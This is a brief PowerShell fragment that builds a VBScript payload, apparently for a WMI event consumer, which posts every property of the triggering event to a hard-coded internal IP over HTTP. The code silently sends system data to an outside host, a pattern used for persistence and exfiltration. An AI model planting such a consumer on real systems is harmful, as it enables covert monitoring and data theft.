$script = @"
Set objHTTP = CreateObject("Microsoft.XMLHTTP")
objHTTP.open "POST", "http://172.16.202.130/", False

objHTTP.setRequestHeader "User-Agent", "DoYouEven-TF12-Bro"

Dim outputString

For Each oProp in TargetEvent.TargetInstance.Properties_
     outputString = outputString & oProp.Name & "=" & oProp & vbCrLf
Next
 
objHTTP.send outputString

Set objHTTP = Nothing
"@

$props = @{
    'Name' = 'GenericHTTPPOST';
    'ScriptText' = $script;
}